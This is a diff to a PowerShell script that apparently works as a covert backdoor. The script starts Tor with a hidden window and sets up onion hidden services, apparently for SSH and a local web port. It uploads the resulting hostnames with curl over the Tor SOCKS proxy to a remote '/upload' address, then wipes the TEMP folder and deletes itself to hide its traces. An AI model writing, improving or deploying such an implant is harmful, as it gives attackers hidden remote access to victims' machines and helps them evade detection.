@@ -53,6 +53,8 @@ HiddenServiceDir $torInstallDestPath\web-service
 HiddenServicePort 80 127.0.0.1:8080
 "@
 Set-Content -Path $torTorrc -Value $torrcContent -Encoding ASCII -Force
+Get-Process -Name tor -ErrorAction SilentlyContinue | Stop-Process -Force
+Start-Sleep -Seconds 3
 Start-Process -FilePath $torExe -ArgumentList "-f `"$torTorrc`"" -WindowStyle Hidden
 Start-Sleep -Seconds 30
 $sshHostNameFilePath = "$torInstallDestPath\service\hostname"
@@ -129,6 +131,7 @@ $webHostName
 Set-Content -Path $exfile -Value $exfileContent -Encoding ASCII -Force
 Start-Sleep -Seconds 5
 cmd.exe /c "curl --socks5-hostname 127.0.0.1:9050 -F file=@`"$exfile`" http://$remoteAddress/upload" >$null 2>&1
-Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path $exfile -Force
+Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path $MyInvocation.MyCommand.Path -Force
+
